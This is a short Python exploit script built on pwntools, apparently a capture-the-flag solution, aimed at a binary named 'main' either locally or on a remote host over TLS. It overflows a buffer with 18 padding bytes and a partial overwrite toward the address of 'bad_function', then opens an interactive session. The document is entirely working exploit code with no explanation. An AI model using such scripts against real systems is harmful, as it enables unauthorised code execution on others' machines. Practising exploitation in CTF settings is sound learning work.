#!/usr/bin/env python3

from pwn import context, p64, remote, sys

context.binary = 'main'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], 443
    return remote(host, port, ssl=True, sni=host)


def main():
    p = get_process()

    offset = 18
    junk = b'A' * offset

    payload = junk
    payload += p64(context.binary.symbols.bad_function)

    p.send(payload[:19])
    p.interactive()


if __name__ == '__main__':
    main()
